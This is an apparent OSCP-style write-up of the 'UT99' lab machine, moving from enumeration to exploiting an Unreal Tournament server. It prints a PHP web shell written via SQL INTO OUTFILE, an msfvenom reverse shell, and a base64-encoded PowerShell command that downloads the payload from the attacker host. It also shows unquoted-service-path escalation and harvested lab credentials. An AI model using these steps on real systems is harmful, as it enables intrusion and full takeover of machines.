The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
```bash
Connected to 192.168.238.44.
220 MadCowz FTP!
Name (192.168.238.44:victor): anonymous
331 Password required for anonymous
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> 
```

### HTTP
```bash
We have our first match next Friday night against Cookie Monsters, so beloved daisy has setup a practice server for user to get back into the swing of things.

Join IRC and Mumble to get more information.

Posted by Fluffy on Saturday, October 03, 2015 (11:18:32) (12 reads)
```

```bash
Re: We are baaaaaaaaack! (Score: 1 )
by kermit on Saturday, October 03, 2015 (11:31:12)
(User Info | Send a Message)
O Sweet! Can't wait!!!11!!1oneoneone!
What game?? Can I join in??? 
```

```bash
nikto -h 192.168.238.44 -p 80 -r /public_html -T 2 -Format txt -o scans/ut99-nikto-misconfig-80

# output
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.238.44
+ Target Hostname:    192.168.238.44
+ Target Port:        80
+ Target Path:        /public_html
+ Start Time:         2021-08-01 23:28:27 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
+ Retrieved x-powered-by header: Dragonfly CMS using PHP engine
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'imagetoolbar' found, with contents: no
+ Cookie CMSSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/admin.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/error.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /public_html/images/: Directory indexing found.
+ Entry '/images/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ OpenSSL/1.0.1p appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ Apache/2.4.16 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.6.12 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ OSVDB-39272: /public_html/favicon.ico file identifies this app/server as: Dragonfly
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ /public_html/.hgignore: .hgignore file found. It is possible to grasp the directory structure.
+ 3165 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2021-08-01 23:33:29 (GMT-4) (302 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Discovered phpmyadmin 4.4.14.
```bash
# Dirsearch started Sun Aug  1 23:44:56 2021 as: dirsearch.py -u http://192.168.238.44 -o /home/victor/oscp/pg/labs/ut99/scans/ut99-dirsearch-root-80

200    18KB  http://192.168.238.44:80/phpmyadmin/ChangeLog
200    12KB  http://192.168.238.44:80/phpmyadmin/doc/html/index.html
200     1KB  http://192.168.238.44:80/phpmyadmin/README
301   346B   http://192.168.238.44:80/phpmyadmin    -> REDIRECTS TO: http://192.168.238.44/phpmyadmin/
200     9KB  http://192.168.238.44:80/phpmyadmin/
200     9KB  http://192.168.238.44:80/phpmyadmin/index.php
301   347B   http://192.168.238.44:80/public_html    -> REDIRECTS TO: http://192.168.238.44/public_html/
200   367B   http://192.168.238.44:80/public_html/robots.txt
```

### IRC
```bash
irssi -c 192.168.238.44 -p 6667
/list
/join ut99

# output
Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778                                                    
22:38 -!- victor [victor@192.168.49.238] has joined #ut99
22:38 -!- Topic for #ut99: Fragging since UT99!  Unreal Tournament 99 Game Server UP!  IP: *THIS*  Port: 7778
22:38 -!- Topic set by daisy [daisy@0::1] [Wed Aug 12 16:05:23 2020]
22:38 [Users #ut99]
22:38 [@daisy] [ victor] 
22:38 -!- Irssi: #ut99: Total of 2 nicks [1 ops, 0 halfops, 0 voices, 1 normal]
22:38 -!- Channel #ut99 created Wed Aug 12 16:05:23 2020
22:38 -!- Irssi: Join to #ut99 was synced in 0 secs
```

```bash
sudo nmap 192.168.238.44 -sU -sV -p7777

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-01 22:52 EDT
Nmap scan report for 192.168.238.44
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
7777/udp open  unreal  Unreal Tournament 2004 game server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.07 seconds
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

```bash
searchsploit unreal
mkdir exploits/edb-id-16145
cd exploits/edb-id-16145
searchsploit -x 16145
nc -nvlp 80 
```

```bash
perl 16145.pl 192.168.238.44 7778 192.168.49.238 80
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

### Privilege Escalation
```bash
whoami

# output
fluffy-pc\daisy
```

```bash
whoami /priv

# output
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

```bash
net user

# output
User accounts for \\FLUFFY-PC

-------------------------------------------------------------------------------
Administrator            daisy                    fluffy                   
Guest                    kermit                   
The command completed successfully.
```

```bash
systeminfo

# output
Host Name:                 FLUFFY-PC
OS Name:                   Microsoftr Windows VistaT Business 
OS Version:                6.0.6002 Service Pack 2 Build 6002
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          fluffy
Registered Organization:   
Product ID:                89584-OEM-7332141-00029
Original Install Date:     10/1/2015, 5:09:16 AM
System Boot Time:          8/4/2021, 4:38:59 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     1,023 MB
Available Physical Memory: 516 MB
Page File: Max Size:       2,309 MB
Page File: Available:      1,148 MB
Page File: In Use:         1,161 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\FLUFFY-PC
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB2305420
                           [02]: KB2999226
                           [03]: KB935509
                           [04]: KB937287
                           [05]: KB938371
                           [06]: KB955430
                           [07]: KB968930
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.238.44
```

```bash
dir c:\

# output
 Volume in drive C is HDD
 Volume Serial Number is DC74-4FCB

 Directory of c:\

10/07/2015  06:21 AM    <DIR>          ftp
01/20/2008  08:03 PM    <DIR>          PerfLogs
10/03/2015  02:17 AM    <DIR>          Program Files
10/07/2015  04:04 AM    <DIR>          Program Files (x86)
10/07/2015  03:54 AM    <DIR>          Python
09/30/2015  10:41 PM    <DIR>          UnrealTournament
09/30/2015  11:19 PM    <DIR>          Users
12/09/2015  07:49 PM    <DIR>          Windows
09/30/2015  11:11 PM    <DIR>          xampp
               0 File(s)              0 bytes
               9 Dir(s)  13,053,014,016 bytes free
```

```bash
wmic service get name,pathname | findstr "Program Files"

# output
FoxitCloudUpdateService         C:\Program Files (x86)\Foxit Software\Foxit Reader\Foxit Cloud\FCUpdateService.exe          
InspIRCd                        C:\Program Files (x86)\InspIRCd\inspircd.exe                                                
VMTools                         "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                         
WMPNetworkSvc                   "C:\Program Files\Windows Media Player\wmpnetwk.exe"
```

```bash
cd "c:\program files (x86)\foxit software\foxit reader\"
```

NOTE: PowerShell would not work for me over this Netcat shell so I took additional steps to leverage PowerShell by other means (SQL injection > PHP shell > PowerShell).
```bash
type c:\xampp\phpMyAdmin\config.inc.php

# output
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'omgwtfbbqmoo';
```

```bash
firefox http://192.168.166.44/phpmyadmin/
# root:omgwtfbbqmoo

madcows > cms_admin (md5?)
fluffy:900772f644a01421c41951a7211314a0

webauth > user_pwd (plain-text)
xampp:wampp

mysql > user (MySQL4.1+)
root:*FF996B5CF37A2D84B021CD150C6D0B0F54F8A83B (root:???)
madcows:*0FC0C8643745194E63606189CD8C01F893A718D2 (madcows:madcows)

mysql > SQL tab 
SELECT "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE "c:/xampp/htdocs/cmd.php"
```

```bash
# verify PHP shell works
firefox http://192.168.166.44/cmd.php?cmd=whoami

# generate a Msfvenom reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.166 LPORT=53 -f exe -o privesc.exe

# serve up the Msfvenom reverse shell so the target can download it via PowerShell-over-PHP-shell (because original Netcat shell was not allowing me to use PowerShell)
sudo nc -nvlp 80
```

```pwsh
# generate a base64 encoding of my PowerShell-based HTTP request for the Msfvenom reverse shell above
$Text = "(New-Object System.Net.WebClient).DownloadFile('http://192.168.49.166/privesc.exe', 'C:\Program Files (x86)\Foxit Software\Foxit.exe')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

# output
KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQA2AD
YALwBwAHIAaQB2AGUAcwBjAC4AZQB4AGUAJwAsACAAJwBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzACAAKAB4ADgANgApAFwARgBvAHgAaQB0ACAAUwBvAGYAdAB3AGEAcgBlAFwARgBvAHgAaQB0AC4AZQB4AGUAJwApAA==
```

```bash
# execute the next HTTP request via PowerShell-over-PHP-shell
firefox http://192.168.166.44/cmd.php?cmd=powershell -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQA2AD
YALwBwAHIAaQB2AGUAcwBjAC4AZQB4AGUAJwAsACAAJwBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzACAAKAB4ADgANgApAFwARgBvAHgAaQB0ACAAUwBvAGYAdAB3AGEAcgBlAFwARgBvAHgAaQB0AC4AZQB4AGUAJwApAA==

# serve up a port for Msfvenom reverse shell to call back to 
sudo nc -nvlp 53
```

```bash
# reboot computer, forcing it to reload the now malicious binary from disk. it will execute and provide shell access as the Foxit software not only had an unquoted file-path for the main .exe, but it also ran as NT AUTHORITY\SYSTEM. 

shutdown /r /t 000
```

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap

## Lessons Learned
* Use multiple tools
